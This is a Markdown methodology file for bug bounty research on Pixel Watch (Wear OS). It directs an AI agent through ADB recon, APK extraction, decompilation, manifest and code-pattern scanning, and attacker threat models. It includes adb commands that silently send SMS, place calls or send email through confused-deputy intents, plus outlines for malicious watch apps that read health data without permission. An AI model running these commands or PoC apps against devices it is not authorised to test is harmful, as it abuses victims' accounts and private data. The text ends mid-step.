# 🎯 Wear OS Bug Bounty Hunting — Comprehensive Steering Instruction File

> **Purpose**: End-to-end skill file for Android Wear OS vulnerability research targeting Google MVRP.
> **Scope**: Pixel Watch (Wear OS 4/5) — system apps, Google apps, Wear-specific APIs.
> **Reference CVE**: [CVE-2025-12080](https://towerofhanoi.it/writeups/cve-2025-12080/) — Intent Abuse in Google Messages for Wear OS
> **Bounty Range**: $500 – $250,000+ depending on severity (Google MVRP)
> **Last Updated**: 2026-05-06

---

## TABLE OF CONTENTS

| Part | Section | Description |
|------|---------|-------------|
| **1** | [Setup & Recon](#part-1--environment-setup--reconnaissance) | ADB setup, package enumeration, APK extraction |
| **2** | [Static Analysis](#part-2--static-analysis-decompilation--code-review) | Decompilation, manifest audit, code pattern scanning |
| **3** | [Threat Model](#part-3--threat-model--attack-vectors) | Attacker models, 7 attack vector categories with validation steps |
| **4** | [Dynamic Analysis](#part-4--dynamic-analysis--runtime-instrumentation) | Frida scripts, ADB fuzzing, runtime hooks |
| **5** | [PoC & Reporting](#part-5--poc-apk-creation-impact-measurement--reporting) | PoC APK templates, CVSS scoring, MVRP report template, cleanup |

---

## WORKFLOW OVERVIEW

```
AGENT_INSTRUCTION: Follow this workflow sequentially. Each phase gates the next.

Phase 1 — SETUP & RECON (Part 1)
  │ Connect ADB → Enumerate packages → Pull all APKs
  │ Output: ./pulled_apks/, ./recon/
  ▼
Phase 2 — STATIC ANALYSIS (Part 2)
  │ Decompile APKs → Audit manifests → Scan source code
  │ Output: ./decompiled/, ./findings/manifest/, ./findings/code/
  ▼
Phase 3 — THREAT MODELING (Part 3)
  │ Map findings to attack vectors → Prioritize by severity
  │ Output: Prioritized attack vector list
  ▼
Phase 4 — DYNAMIC VALIDATION (Part 4)
  │ Deploy Frida → Hook targets → Fuzz intents → Capture evidence
  │ Output: ./findings/dynamic/, logcat captures
  ▼
Phase 5 — PoC & REPORT (Part 5)
  │ Build minimal PoC APK → Measure impact → Write report → CLEANUP
  │ Output: PoC APK, screen recording, MVRP report, cleaned device
```

---

# PART 1 — ENVIRONMENT SETUP & RECONNAISSANCE

---

## 1.1 Prerequisites & Tool Installation

### Hardware Required
- **Target Device**: Pixel Watch / Pixel Watch 2 / Pixel Watch 3 (running latest Wear OS)
- **Companion Phone**: Pixel phone paired with the watch
- **Computer**: macOS/Linux with ADB, Android Studio
- **Optional**: nRF52840 dongle (for BLE sniffing)

### Software Setup

```bash
# ── Install core tools ──
brew install android-platform-tools   # ADB
brew install jadx                      # Java decompiler
brew install apktool                   # APK disassembly / rebuild
pip3 install frida-tools               # Frida dynamic instrumentation
brew install wireshark                 # Packet analysis

# ── Verify installations ──
adb version
jadx --version
apktool --version
frida --version
```

### Android Studio Setup (for PoC APK building)
```bash
# Install via: https://developer.android.com/studio
# Required SDK components:
# - Android SDK Platform (API 34+)
# - Wear OS 5 system image (ARM64)
# - Android SDK Build-Tools
# - Wear OS Emulator (Pixel Watch 2 AVD) — for initial testing before hardware
```

---

## 1.2 Enable ADB on Pixel Watch

### Step-by-Step

```
AGENT_INSTRUCTION: Execute these steps on the physical Pixel Watch device.

1. On watch: Settings → System → About
2. Tap "Build number" 7 times → "You are now a developer"
3. Settings → Developer options → Enable "ADB debugging"
4. Settings → Developer options → Enable "Debug over Wi-Fi"
5. Note the IP:PORT displayed (e.g., 192.168.1.42:5555)
```

### Connect via ADB

```bash
# ── Pair (first time only) ──
adb pair <WATCH_IP>:<PAIRING_PORT>
# Enter the 6-digit pairing code shown on watch

# ── Connect ──
adb connect <WATCH_IP>:<PORT>

# ── Verify connection ──
adb devices
# Should show: <WATCH_IP>:<PORT>    device

# ── Verify Wear OS version ──
adb shell getprop ro.build.display.id
adb shell getprop ro.build.version.security_patch
adb shell getprop ro.product.model
```

### Record Device Info (for report)

```bash
# ── Capture full device fingerprint ──
DEVICE_INFO_DIR="./device_info"
mkdir -p "$DEVICE_INFO_DIR"

adb shell getprop > "$DEVICE_INFO_DIR/full_properties.txt"
adb shell getprop ro.build.display.id > "$DEVICE_INFO_DIR/build_id.txt"
adb shell getprop ro.build.version.security_patch > "$DEVICE_INFO_DIR/security_patch.txt"
adb shell getprop ro.product.model > "$DEVICE_INFO_DIR/model.txt"
adb shell getprop ro.build.version.release > "$DEVICE_INFO_DIR/android_version.txt"
adb shell settings get global wear_platform_version > "$DEVICE_INFO_DIR/wear_version.txt"

echo "=== Device Report ==="
echo "Model: $(cat $DEVICE_INFO_DIR/model.txt)"
echo "Build: $(cat $DEVICE_INFO_DIR/build_id.txt)"
echo "Patch: $(cat $DEVICE_INFO_DIR/security_patch.txt)"
echo "Android: $(cat $DEVICE_INFO_DIR/android_version.txt)"
```

---

## 1.3 Enumerate All Installed Packages

### List All Packages

```bash
# ── Create output directory ──
RECON_DIR="./recon"
mkdir -p "$RECON_DIR"

# ── All packages ──
adb shell pm list packages > "$RECON_DIR/all_packages.txt"

# ── System packages only ──
adb shell pm list packages -s > "$RECON_DIR/system_packages.txt"

# ── Third-party packages only ──
adb shell pm list packages -3 > "$RECON_DIR/third_party_packages.txt"

# ── Disabled packages ──
adb shell pm list packages -d > "$RECON_DIR/disabled_packages.txt"

# ── Package count summary ──
echo "=== Package Summary ==="
echo "Total:       $(wc -l < $RECON_DIR/all_packages.txt)"
echo "System:      $(wc -l < $RECON_DIR/system_packages.txt)"
echo "Third-party: $(wc -l < $RECON_DIR/third_party_packages.txt)"
echo "Disabled:    $(wc -l < $RECON_DIR/disabled_packages.txt)"
```

### High-Priority Wear OS Packages (Target List)

```bash
# ── Wear OS specific high-value targets ──
PRIORITY_PACKAGES=(
  # Core Wear OS
  "com.google.android.wearable.app"            # Wear OS companion/system
  "com.google.android.clockwork.home"           # Watch home/launcher
  "com.google.android.apps.wearable.systemui"   # System UI
  "com.google.android.wearable.sysui"           # System UI (alt)
  
  # Communication (CVE-2025-12080 class)
  "com.google.android.apps.messaging"           # Google Messages (PROVEN VULN)
  "com.google.android.dialer"                   # Phone/Dialer
  "com.google.android.apps.maps"                # Google Maps
  "com.google.android.gms"                      # Google Play Services
  
  # Health & Sensors
  "com.google.android.apps.fitness"             # Google Fit
  "com.google.android.apps.healthdata"          # Health Services
  "com.google.android.wearable.healthservices"  # Health Services system
  
  # Payments & Auth
  "com.google.android.apps.walletnfcrel"        # Google Wallet/Pay
  "com.google.android.apps.authenticator2"      # Google Authenticator
  
  # Media & Tiles
  "com.google.android.wearable.media.routing"   # Media routing
  "com.google.android.apps.youtube.music"       # YouTube Music
  "com.google.android.wearable.tiles"           # Tiles framework
  
  # System Services
  "com.google.android.settings"                 # Settings
  "com.google.android.wearable.settings"        # Wear Settings
  "com.google.android.wearable.connectivity"    # Connectivity manager
  "com.google.android.wearable.assistant"       # Google Assistant
)

# ── Check which priority packages are installed ──
echo "=== Priority Target Availability ===" > "$RECON_DIR/priority_targets.txt"
for pkg in "${PRIORITY_PACKAGES[@]}"; do
  STATUS=$(adb shell pm list packages "$pkg" 2>/dev/null)
  if [ -n "$STATUS" ]; then
    VERSION=$(adb shell dumpsys package "$pkg" | grep "versionName" | head -1 | awk '{print $1}')
    echo "[FOUND] $pkg ($VERSION)" >> "$RECON_DIR/priority_targets.txt"
  else
    echo "[MISSING] $pkg" >> "$RECON_DIR/priority_targets.txt"
  fi
done
cat "$RECON_DIR/priority_targets.txt"
```

---

## 1.4 Pull All APKs from Watch

### Batch APK Extraction Script

```bash
#!/bin/bash
# ── pull_all_apks.sh ──
# Pulls all installed APKs from the connected Wear OS device

APK_DIR="./pulled_apks"
mkdir -p "$APK_DIR/system" "$APK_DIR/third_party" "$APK_DIR/priority"

LOGFILE="$APK_DIR/pull_log.txt"
echo "APK Pull Log - $(date)" > "$LOGFILE"

pull_apk() {
  local PACKAGE=$1
  local DEST_DIR=$2
  
  # Get APK path
  APK_PATH=$(adb shell pm path "$PACKAGE" 2>/dev/null | head -1 | sed 's/package://')
  
  if [ -z "$APK_PATH" ]; then
    echo "[SKIP] $PACKAGE - no path found" | tee -a "$LOGFILE"
    return
  fi
  
  # Clean package name for filename
  FILENAME=$(echo "$PACKAGE" | tr '.' '_')
  
  # Pull APK
  adb pull "$APK_PATH" "$DEST_DIR/${FILENAME}.apk" 2>/dev/null
  
  if [ $? -eq 0 ]; then
    SIZE=$(ls -lh "$DEST_DIR/${FILENAME}.apk" | awk '{print $5}')
    echo "[OK] $PACKAGE → $DEST_DIR/${FILENAME}.apk ($SIZE)" | tee -a "$LOGFILE"
  else
    echo "[FAIL] $PACKAGE - pull failed" | tee -a "$LOGFILE"
  fi
}

# ── Pull priority targets first ──
echo "=== Pulling Priority Targets ===" | tee -a "$LOGFILE"
while IFS= read -r line; do
  PKG=$(echo "$line" | sed 's/package://')
  pull_apk "$PKG" "$APK_DIR/priority"
done < <(adb shell pm list packages | grep -E "messaging|dialer|wearable|fitness|wallet|health|clockwork|gms")

# ── Pull all system packages ──
echo "=== Pulling System Packages ===" | tee -a "$LOGFILE"
while IFS= read -r line; do
  PKG=$(echo "$line" | sed 's/package://')
  pull_apk "$PKG" "$APK_DIR/system"
done < <(adb shell pm list packages -s)

# ── Pull third-party packages ──
echo "=== Pulling Third-Party Packages ===" | tee -a "$LOGFILE"
while IFS= read -r line; do
  PKG=$(echo "$line" | sed 's/package://')
  pull_apk "$PKG" "$APK_DIR/third_party"
done < <(adb shell pm list packages -3)

echo "=== Pull Complete ===" | tee -a "$LOGFILE"
echo "Total APKs: $(find $APK_DIR -name '*.apk' | wc -l)" | tee -a "$LOGFILE"
```

### Split APK Handling (for bundled apps)

```bash
# Some Wear OS apps use split APKs. Handle them:
pull_split_apk() {
  local PACKAGE=$1
  local DEST_DIR="$APK_DIR/split/$PACKAGE"
  mkdir -p "$DEST_DIR"
  
  # Get all APK paths (base + splits)
  adb shell pm path "$PACKAGE" | while IFS= read -r line; do
    APK_PATH=$(echo "$line" | sed 's/package://')
    BASENAME=$(basename "$APK_PATH")
    adb pull "$APK_PATH" "$DEST_DIR/$BASENAME"
    echo "  Pulled: $BASENAME"
  done
  
  echo "[SPLIT] $PACKAGE → $DEST_DIR/"
}

# Example: Google Messages often has split APKs on Wear
pull_split_apk "com.google.android.apps.messaging"
```

---

## 1.5 Initial Reconnaissance Dumps

### Dumpsys Collection

```bash
DUMPS_DIR="./recon/dumpsys"
mkdir -p "$DUMPS_DIR"

# ── Critical dumpsys outputs ──
adb shell dumpsys package > "$DUMPS_DIR/package_full.txt"
adb shell dumpsys activity > "$DUMPS_DIR/activity_full.txt"
adb shell dumpsys activity services > "$DUMPS_DIR/services.txt"
adb shell dumpsys activity broadcasts > "$DUMPS_DIR/broadcasts.txt"
adb shell dumpsys content > "$DUMPS_DIR/content_providers.txt"
adb shell dumpsys bluetooth_manager > "$DUMPS_DIR/bluetooth.txt"
adb shell dumpsys notification > "$DUMPS_DIR/notifications.txt"
adb shell dumpsys sensorservice > "$DUMPS_DIR/sensors.txt"

# ── Wear-specific dumps ──
adb shell dumpsys activity service com.google.android.gms/.wearable.service.WearableService \
  > "$DUMPS_DIR/wearable_service.txt" 2>/dev/null
adb shell dumpsys activity service WearHealthService \
  > "$DUMPS_DIR/health_service.txt" 2>/dev/null

# ── Permission audit ──
adb shell dumpsys package permissions > "$DUMPS_DIR/all_permissions.txt"

# ── Running processes ──
adb shell ps -A > "$DUMPS_DIR/processes.txt"
```

### Exported Component Quick Scan

```bash
# ── Find all exported components across all packages ──
EXPORTED_DIR="./recon/exported"
mkdir -p "$EXPORTED_DIR"

# Exported Activities
adb shell dumpsys package | grep -B1 "exported=true" | grep "Activity" \
  > "$EXPORTED_DIR/exported_activities.txt"

# Exported Services  
adb shell dumpsys package | grep -B1 "exported=true" | grep "Service" \
  > "$EXPORTED_DIR/exported_services.txt"

# Exported Receivers
adb shell dumpsys package | grep -B1 "exported=true" | grep "Receiver" \
  > "$EXPORTED_DIR/exported_receivers.txt"

# Exported Providers
adb shell dumpsys package | grep -B1 "exported=true" | grep "Provider" \
  > "$EXPORTED_DIR/exported_providers.txt"

echo "=== Exported Component Summary ==="
echo "Activities: $(wc -l < $EXPORTED_DIR/exported_activities.txt)"
echo "Services:   $(wc -l < $EXPORTED_DIR/exported_services.txt)"
echo "Receivers:  $(wc -l < $EXPORTED_DIR/exported_receivers.txt)"
echo "Providers:  $(wc -l < $EXPORTED_DIR/exported_providers.txt)"
```


---


# PART 2 — STATIC ANALYSIS (DECOMPILATION & CODE REVIEW)

---

## 2.1 APK Decompilation Pipeline

### Batch Decompile with JADX

```bash
#!/bin/bash
# ── decompile_all.sh ──
# Decompiles all pulled APKs using jadx for Java source review

APK_DIR="./pulled_apks/priority"
DECOMPILED_DIR="./decompiled"
mkdir -p "$DECOMPILED_DIR"

LOGFILE="./decompiled/decompile_log.txt"
echo "Decompilation Log - $(date)" > "$LOGFILE"

for apk in "$APK_DIR"/*.apk; do
  BASENAME=$(basename "$apk" .apk)
  OUTPUT="$DECOMPILED_DIR/$BASENAME"
  
  if [ -d "$OUTPUT" ]; then
    echo "[SKIP] $BASENAME - already decompiled" | tee -a "$LOGFILE"
    continue
  fi
  
  echo "[DECOMPILE] $BASENAME..." | tee -a "$LOGFILE"
  jadx -d "$OUTPUT" --show-bad-code --deobf "$apk" 2>> "$LOGFILE"
  
  if [ $? -eq 0 ]; then
    echo "[OK] $BASENAME → $OUTPUT" | tee -a "$LOGFILE"
  else
    echo "[WARN] $BASENAME - partial decompilation" | tee -a "$LOGFILE"
  fi
done

echo "=== Decompilation Complete ===" | tee -a "$LOGFILE"
```

### Disassemble with Apktool (for Manifest & smali)

```bash
#!/bin/bash
# ── disassemble_all.sh ──
# Disassembles APKs with apktool for AndroidManifest.xml and smali code

APK_DIR="./pulled_apks/priority"
SMALI_DIR="./disassembled"
mkdir -p "$SMALI_DIR"

for apk in "$APK_DIR"/*.apk; do
  BASENAME=$(basename "$apk" .apk)
  OUTPUT="$SMALI_DIR/$BASENAME"
  
  echo "[DISASSEMBLE] $BASENAME..."
  apktool d "$apk" -o "$OUTPUT" -f 2>/dev/null
  
  if [ -f "$OUTPUT/AndroidManifest.xml" ]; then
    echo "[OK] Manifest extracted: $OUTPUT/AndroidManifest.xml"
  fi
done
```

---

## 2.2 AndroidManifest.xml Audit

### Automated Manifest Scanner Script

```bash
#!/bin/bash
# ── manifest_audit.sh ──
# Scans AndroidManifest.xml files for security-relevant configurations

SMALI_DIR="./disassembled"
FINDINGS_DIR="./findings/manifest"
mkdir -p "$FINDINGS_DIR"

audit_manifest() {
  local MANIFEST=$1
  local PKG_NAME=$(basename "$(dirname "$MANIFEST")")
  local REPORT="$FINDINGS_DIR/${PKG_NAME}_manifest_audit.txt"
  
  echo "=== Manifest Audit: $PKG_NAME ===" > "$REPORT"
  echo "File: $MANIFEST" >> "$REPORT"
  echo "Date: $(date)" >> "$REPORT"
  echo "" >> "$REPORT"
  
  # ── 1. Exported Activities without permission ──
  echo "--- EXPORTED ACTIVITIES (no permission guard) ---" >> "$REPORT"
  grep -n 'android:exported="true"' "$MANIFEST" | while read -r line; do
    LINE_NUM=$(echo "$line" | cut -d: -f1)
    # Check if the next few lines have a permission attribute
    CONTEXT=$(sed -n "$((LINE_NUM-2)),$((LINE_NUM+10))p" "$MANIFEST")
    if ! echo "$CONTEXT" | grep -q "android:permission"; then
      echo "[CRITICAL] Line $LINE_NUM: Exported without permission guard" >> "$REPORT"
      echo "$CONTEXT" >> "$REPORT"
      echo "" >> "$REPORT"
    fi
  done
  
  # ── 2. Intent Filters on exported components ──
  echo "--- INTENT FILTERS ---" >> "$REPORT"
  grep -n -A5 "<intent-filter" "$MANIFEST" | grep -E "action|category|data" >> "$REPORT"
  echo "" >> "$REPORT"
  
  # ── 3. Custom permissions (look for signature vs dangerous) ──
  echo "--- CUSTOM PERMISSIONS ---" >> "$REPORT"
  grep -n "permission.*android:protectionLevel" "$MANIFEST" >> "$REPORT"
  echo "" >> "$REPORT"
  
  # ── 4. Backup allowed ──
  echo "--- BACKUP CONFIG ---" >> "$REPORT"
  if grep -q 'android:allowBackup="true"' "$MANIFEST"; then
    echo "[HIGH] Backup enabled - data exfiltration via adb backup" >> "$REPORT"
  fi
  echo "" >> "$REPORT"
  
  # ── 5. Debuggable ──
  echo "--- DEBUG CONFIG ---" >> "$REPORT"
  if grep -q 'android:debuggable="true"' "$MANIFEST"; then
    echo "[CRITICAL] App is debuggable!" >> "$REPORT"
  fi
  echo "" >> "$REPORT"
  
  # ── 6. ContentProviders ──
  echo "--- CONTENT PROVIDERS ---" >> "$REPORT"
  grep -n -A5 "<provider" "$MANIFEST" >> "$REPORT"
  echo "" >> "$REPORT"
  
  # ── 7. Deep links / URI schemes ──
  echo "--- URI SCHEMES / DEEP LINKS ---" >> "$REPORT"
  grep -n -B2 -A5 'android:scheme=' "$MANIFEST" >> "$REPORT"
  echo "" >> "$REPORT"
  
  # ── 8. Wear-specific: TileService / ComplicationProviderService ──
  echo "--- WEAR OS SPECIFIC SERVICES ---" >> "$REPORT"
  grep -n -A10 "TileService\|ComplicationProviderService\|WearableListenerService" "$MANIFEST" >> "$REPORT"
  echo "" >> "$REPORT"
  
  echo "[DONE] $PKG_NAME → $REPORT"
}

# ── Run audit on all decompiled manifests ──
find "$SMALI_DIR" -name "AndroidManifest.xml" -maxdepth 2 | while read -r manifest; do
  audit_manifest "$manifest"
done

echo "=== Manifest Audit Complete ==="
echo "Findings: $FINDINGS_DIR/"
```

### Key Manifest Patterns to Flag

```
AGENT_INSTRUCTION: When reviewing manifests, flag these patterns as HIGH PRIORITY:

1. EXPORTED WITHOUT PERMISSION:
   <activity android:exported="true"> with NO android:permission attribute
   → Potential confused-deputy (CVE-2025-12080 class)

2. SMS/CALL URI HANDLERS:
   <data android:scheme="sms" /> or "smsto" or "tel" or "mailto"
   → Silent action triggers without user confirmation

3. WEAR-SPECIFIC SERVICES:
   <service> extending TileService / ComplicationProviderService
   → These run outside Activity lifecycle, no confirmation UX

4. CUSTOM PERMISSIONS WITH protectionLevel="normal":
   → Any app can request these, no user prompt

5. CONTENT PROVIDERS WITH grantUriPermissions="true":
   → Potential data leakage across app boundaries

6. WearableListenerService WITHOUT permission:
   → Data Layer messages from watch/phone handled without auth
```

---

## 2.3 Source Code Vulnerability Patterns

### Automated Source Code Scanner

```bash
#!/bin/bash
# ── code_scanner.sh ──
# Searches decompiled Java/Kotlin source for vulnerability patterns

DECOMPILED_DIR="./decompiled"
FINDINGS_DIR="./findings/code"
mkdir -p "$FINDINGS_DIR"

scan_package() {
  local PKG_DIR=$1
  local PKG_NAME=$(basename "$PKG_DIR")
  local REPORT="$FINDINGS_DIR/${PKG_NAME}_code_findings.txt"
  
  echo "=== Code Scan: $PKG_NAME ===" > "$REPORT"
  
  # ── Intent handling without validation ──
  echo "--- INTENT HANDLING (getIntent/getExtras without validation) ---" >> "$REPORT"
  grep -rn "getIntent\|getExtras\|getStringExtra\|getParcelableExtra" "$PKG_DIR/sources/" \
    --include="*.java" 2>/dev/null | head -50 >> "$REPORT"
  echo "" >> "$REPORT"
  
  # ── startActivity without user confirmation ──
  echo "--- STARTACTIVITY CALLS (potential silent actions) ---" >> "$REPORT"
  grep -rn "startActivity\|startService\|sendBroadcast" "$PKG_DIR/sources/" \
    --include="*.java" 2>/dev/null | head -50 >> "$REPORT"
  echo "" >> "$REPORT"
  
  # ── SMS/Call related code ──
  echo "--- SMS/TELEPHONY CODE ---" >> "$REPORT"
  grep -rn "SmsManager\|ACTION_SENDTO\|ACTION_SEND\|ACTION_CALL\|ACTION_DIAL" "$PKG_DIR/sources/" \
    --include="*.java" 2>/dev/null >> "$REPORT"
  echo "" >> "$REPORT"
  
  # ── ContentProvider queries (SQL injection) ──
  echo "--- CONTENT PROVIDER QUERIES ---" >> "$REPORT"
  grep -rn "rawQuery\|execSQL\|query.*selection" "$PKG_DIR/sources/" \
    --include="*.java" 2>/dev/null | head -30 >> "$REPORT"
  echo "" >> "$REPORT"
  
  # ── File operations (path traversal) ──
  echo "--- FILE OPERATIONS ---" >> "$REPORT"
  grep -rn "openFileOutput\|openFileInput\|getExternalStorage\|FileProvider\|openFile" "$PKG_DIR/sources/" \
    --include="*.java" 2>/dev/null | head -30 >> "$REPORT"
  echo "" >> "$REPORT"
  
  # ── Hardcoded secrets ──
  echo "--- HARDCODED SECRETS ---" >> "$REPORT"
  grep -rn "api_key\|apikey\|secret\|password\|token.*=.*\"" "$PKG_DIR/sources/" \
    --include="*.java" -i 2>/dev/null | head -20 >> "$REPORT"
  echo "" >> "$REPORT"
  
  # ── WebView (XSS/RCE) ──
  echo "--- WEBVIEW USAGE ---" >> "$REPORT"
  grep -rn "WebView\|loadUrl\|loadData\|addJavascriptInterface\|setJavaScriptEnabled" "$PKG_DIR/sources/" \
    --include="*.java" 2>/dev/null | head -30 >> "$REPORT"
  echo "" >> "$REPORT"
  
  # ── Health/Sensor data access ──
  echo "--- HEALTH/SENSOR DATA ACCESS ---" >> "$REPORT"
  grep -rn "HealthServicesClient\|PassiveMonitoringClient\|SensorManager\|BODY_SENSORS\|heartRate\|HeartRate" \
    "$PKG_DIR/sources/" --include="*.java" 2>/dev/null | head -30 >> "$REPORT"
  echo "" >> "$REPORT"
  
  # ── Data Layer (watch-phone bridge) ──
  echo "--- WEARABLE DATA LAYER ---" >> "$REPORT"
  grep -rn "MessageClient\|DataClient\|ChannelClient\|WearableListenerService\|onMessageReceived\|onDataChanged" \
    "$PKG_DIR/sources/" --include="*.java" 2>/dev/null | head -30 >> "$REPORT"
  echo "" >> "$REPORT"
  
  # ── Crypto weaknesses ──
  echo "--- CRYPTO USAGE ---" >> "$REPORT"
  grep -rn "DES\|MD5\|SHA1\|ECB\|NoPadding\|TrustAllCerts\|ALLOW_ALL" "$PKG_DIR/sources/" \
    --include="*.java" 2>/dev/null | head -20 >> "$REPORT"
  echo "" >> "$REPORT"
  
  # ── PendingIntent without FLAG_IMMUTABLE ──
  echo "--- PENDING INTENT FLAGS ---" >> "$REPORT"
  grep -rn "PendingIntent" "$PKG_DIR/sources/" --include="*.java" 2>/dev/null \
    | grep -v "FLAG_IMMUTABLE" | head -20 >> "$REPORT"
  echo "" >> "$REPORT"
  
  echo "[DONE] $PKG_NAME → $REPORT"
}

# ── Scan all decompiled packages ──
for pkg_dir in "$DECOMPILED_DIR"/*/; do
  scan_package "$pkg_dir"
done

echo "=== Code Scan Complete ==="
```

---

## 2.4 Specific Analysis: Google Messages (CVE-2025-12080 Pattern)

```
AGENT_INSTRUCTION: This is the reference vulnerability pattern. Apply this exact
analysis methodology to ALL communication apps on Wear OS.

CVE-2025-12080 Root Cause:
- Google Messages on Wear OS handles ACTION_SENDTO with sms:/smsto:/mms:/mmsto: URI schemes
- On the PHONE version, a confirmation dialog appears before sending
- On the WEAR OS version, the message is sent IMMEDIATELY without confirmation
- No SEND_SMS permission required — any app can trigger the intent
- This is a "confused deputy" vulnerability

REPLICATION PATTERN — Apply to these targets:
1. com.google.android.dialer     → Check ACTION_CALL / ACTION_DIAL (tel: scheme)
2. com.google.android.apps.maps  → Check geo: / google.navigation: schemes
3. com.google.android.gm         → Check mailto: scheme
4. com.google.android.calendar   → Check content://com.android.calendar
5. Any app with ACTION_VIEW + exported Activity
```

### Manual Code Review Checklist

```bash
# For each decompiled target, examine:

# 1. Find the Activity that handles the vulnerable intent
grep -rn "ACTION_SENDTO\|ACTION_SEND\|ACTION_VIEW\|ACTION_CALL" \
  ./decompiled/<TARGET>/sources/ --include="*.java"

# 2. Trace the intent handling code path
# Look for: getIntent() → extract data → perform action
# Flag if: NO AlertDialog / NO confirmation step / NO user interaction check

# 3. Check if the Activity has exported=true in manifest
grep -A10 "activity.*<TARGET_ACTIVITY>" \
  ./disassembled/<TARGET>/AndroidManifest.xml

# 4. Verify no permission guard
# Flag if: no android:permission attribute on the exported component

# 5. Check for Wear OS specific bypasses
# The Wear OS version may skip confirmation UX that exists in the phone version
# Compare wear APK manifest vs phone APK manifest for the same app
```


---


# PART 3 — THREAT MODEL & ATTACK VECTORS

---

## 3.1 Wear OS Threat Model

### Attacker Models

```
┌─────────────────────────────────────────────────────────────────────┐
│                    WEAR OS ATTACKER MODELS                         │
├─────────────────────────────────────────────────────────────────────┤
│                                                                     │
│  MODEL A — MALICIOUS WATCH APP (Primary, CVE-2025-12080 class)     │
│  ├─ Attacker installs a seemingly benign app on the watch          │
│  ├─ App requires NO special permissions                            │
│  ├─ App sends crafted intents to system/Google apps                │
│  ├─ Exploits: confused deputy, silent actions, data exfiltration   │
│  └─ Impact: SMS sending, calls, health data theft, payments        │
│                                                                     │
│  MODEL B — COMPANION PHONE APP (Lateral Movement)                  │
│  ├─ Attacker has app on paired phone                               │
│  ├─ Uses Wearable Data Layer to reach watch components             │
│  ├─ Exploits: cross-device trust, MessageClient abuse              │
│  └─ Impact: Remote control of watch, sensor exfiltration           │
│                                                                     │
│  MODEL C — PROXIMITY BLE ATTACKER                                  │
│  ├─ Attacker within BLE range (~30m)                               │
│  ├─ Uses BLE sniffing / MITM tools                                 │
│  ├─ Exploits: weak pairing, unauthenticated GATT services          │
│  └─ Impact: Data interception, notification spoofing               │
│                                                                     │
│  MODEL D — MALICIOUS TILE/COMPLICATION PROVIDER                    │
│  ├─ Attacker registers as Tile or Complication data provider       │
│  ├─ Tiles run in a separate process (no Activity lifecycle)        │
│  ├─ Exploits: intent launch from tiles, UI redressing              │
│  └─ Impact: Silent privileged actions, data spoofing               │
│                                                                     │
│  MODEL E — NETWORK/CLOUD ATTACKER                                  │
│  ├─ Attacker intercepts watch HTTP/S traffic                       │
│  ├─ Watch makes direct API calls (bypassing phone)                 │
│  ├─ Exploits: weak cert pinning, over-scoped OAuth tokens          │
│  └─ Impact: Token theft, API abuse, account takeover               │
│                                                                     │
└─────────────────────────────────────────────────────────────────────┘
```

### Wear OS vs Android — Unique Attack Surface Gaps

```
AGENT_INSTRUCTION: These gaps are the PRIMARY reason Wear OS is under-researched
and likely to yield novel vulnerabilities. Focus on these differentiators.

GAP 1: NO CONFIRMATION UX ON TILES
  - Tiles (TileService) run outside the Activity lifecycle
  - Intent launch from a Tile has no natural place for a confirmation dialog
  - Phone Android apps rely on Activity-based confirmation → not available on Wear
  - CVE-2025-12080 PROVEN this gap exists in production

GAP 2: HEALTH SERVICES PERMISSION IMMATURITY
  - Health Services is a privileged Wear OS system service
  - Permission model for HR, ECG, SpO2, body temp is newer than phone's Health Connect
  - Passive monitoring vs active exercise sessions may use different permission paths
  - Race condition: permission revoked but listener still receiving data

GAP 3: DATA LAYER TRUST BOUNDARY
  - Wearable Data Layer tunnels data over BLE between watch ↔ phone
  - Many phone-side WearableListenerService handlers are exported
  - Phone apps implicitly trust messages from "their" watch
  - A malicious watch app can impersonate messages to any phone-side listener

GAP 4: STRIPPED-DOWN APP PORTS
  - Many Wear OS apps are simplified ports of phone apps
  - Developers copy intent handlers from phone code but skip Wear-specific UX adaptation
  - Permission checks present on phone may be absent on Wear version
  - Smaller QA teams test Wear variants

GAP 5: LIMITED SECURITY TOOLING
  - Few researchers test Wear OS → known Android bug classes often unpatched
  - drozer, Frida, Objection all work but require manual setup on watch
  - Automated scanners (MobSF, QARK) don't have Wear-specific rulesets
```

---

## 3.2 Attack Vector Catalog — With Validation Steps

### VECTOR 1: Intent/IPC Abuse (CRITICAL — Proven by CVE-2025-12080)

```
SEVERITY: CRITICAL
ATTACKER MODEL: A (Malicious Watch App), D (Malicious Tile)
CWE: CWE-927 (Use of Implicit Intent for Sensitive Communication)
REFERENCE: CVE-2025-12080

TARGET APPS:
- com.google.android.apps.messaging  (PROVEN VULNERABLE)
- com.google.android.dialer
- com.google.android.apps.maps
- com.google.android.gm (Gmail)
- com.google.android.calendar
- Any app with exported Activities handling ACTION_SENDTO/ACTION_VIEW

VALIDATION STEPS:

Step 1 — Identify exported intent handlers
  $ grep -rn 'exported="true"' ./disassembled/<TARGET>/AndroidManifest.xml
  $ grep -rn 'intent-filter' ./disassembled/<TARGET>/AndroidManifest.xml

Step 2 — Test each URI scheme via ADB
  # SMS (CVE-2025-12080 pattern)
  $ adb shell am start -a android.intent.action.SENDTO \
    -d "smsto:+1234567890" --es sms_body "test_message"
  
  # Phone call
  $ adb shell am start -a android.intent.action.CALL \
    -d "tel:+1234567890"
  
  # Email
  $ adb shell am start -a android.intent.action.SENDTO \
    -d "mailto:test@example.com" --es android.intent.extra.SUBJECT "test"
  
  # Maps navigation
  $ adb shell am start -a android.intent.action.VIEW \
    -d "google.navigation:q=destination"

Step 3 — Check for user confirmation
  CRITICAL CHECK: Does the action execute WITHOUT showing a confirmation dialog?
  - If YES → VULNERABILITY CONFIRMED (confused deputy)
  - If NO → Note the confirmation mechanism for bypass attempts

Step 4 — Test from Tile context
  Build a PoC TileService that launches the same intent from onTileRequest
  (Tiles run outside Activity lifecycle — confirmation may be bypassed)

Step 5 — Verify no permission required
  $ adb shell am start -a android.intent.action.SENDTO \
    -d "smsto:+1234567890" --es sms_body "test" \
    --user 0
  # If this works without SEND_SMS permission → exploitable by any app
```

### VECTOR 2: Health Services Data Leakage (HIGH)

```
SEVERITY: HIGH
ATTACKER MODEL: A (Malicious Watch App)
CWE: CWE-862 (Missing Authorization)

TARGET SERVICES:
- com.google.android.wearable.healthservices
- com.google.android.apps.fitness
- com.google.android.apps.healthdata

VALIDATION STEPS:

Step 1 — Check Health Services IPC surface
  $ adb shell dumpsys activity service HealthServicesService
  $ adb shell service list | grep -i health

Step 2 — Test passive monitoring without permission
  Build a PoC app that registers as PassiveMonitoringClient
  WITHOUT requesting BODY_SENSORS permission
  
  # Check if health data callbacks fire:
  # - Heart rate
  # - Step count  
  # - SpO2
  # - Skin temperature

Step 3 — Test permission revocation race
